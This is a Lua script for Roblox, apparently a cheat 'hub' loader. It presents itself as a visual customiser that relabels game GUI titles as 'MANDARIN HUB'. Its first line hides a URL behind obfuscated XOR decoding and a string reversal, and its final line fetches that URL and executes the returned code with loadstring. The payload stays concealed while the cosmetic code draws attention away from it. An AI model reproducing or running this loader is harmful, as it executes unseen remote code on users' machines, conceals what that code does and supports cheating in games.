
--[[ STAGE 2: VISUAL CORE ]]
local uu3mYvmePW9Thd6XKBf="\175\185\164\116\154\116\129\151\164\080\110\083\148\086\076\084\131\071\070\067\058\045\032\050\037\088\092\075\008\009\001\005\013"local PfU_4xlScLrInKc=120 local nYxAtr3iPXw3OBwO5T3BE=131 local WxzmKY8aX9c1EEM=1 local vUGhiOMYwnYmg3d7Zze=4 local hZ9qbojy1MKJlCRkdn=6 local _zNXyojp0tl3uZWHBnh=true local YaG4Vwf7T_DX=bit32 and bit32.bxor if not YaG4Vwf7T_DX then YaG4Vwf7T_DX=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local eZR4sP2SxHihD8Oh1T={}for lAha5QnUATjiXa758=1,#uu3mYvmePW9Thd6XKBf do local D7EPwh0WdymyCuFjl=string.byte(uu3mYvmePW9Thd6XKBf,lAha5QnUATjiXa758)local TNfQgBMLeS2p5FyMsLUwo4=(nYxAtr3iPXw3OBwO5T3BE+(lAha5QnUATjiXa758*vUGhiOMYwnYmg3d7Zze)+hZ9qbojy1MKJlCRkdn)%256 if WxzmKY8aX9c1EEM==0 then D7EPwh0WdymyCuFjl=(D7EPwh0WdymyCuFjl-TNfQgBMLeS2p5FyMsLUwo4)%256 eZR4sP2SxHihD8Oh1T[lAha5QnUATjiXa758]=string.char(YaG4Vwf7T_DX(D7EPwh0WdymyCuFjl,PfU_4xlScLrInKc))else D7EPwh0WdymyCuFjl=YaG4Vwf7T_DX(D7EPwh0WdymyCuFjl,PfU_4xlScLrInKc)eZR4sP2SxHihD8Oh1T[lAha5QnUATjiXa758]=string.char((D7EPwh0WdymyCuFjl-TNfQgBMLeS2p5FyMsLUwo4)%256)end end local xtBL2Lw4CW7I=table.concat(eZR4sP2SxHihD8Oh1T)if _zNXyojp0tl3uZWHBnh then xtBL2Lw4CW7I=string.reverse(xtBL2Lw4CW7I)end local nfrX3VQOmD7amF=xtBL2Lw4CW7I
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(nfrX3VQOmD7amF))()
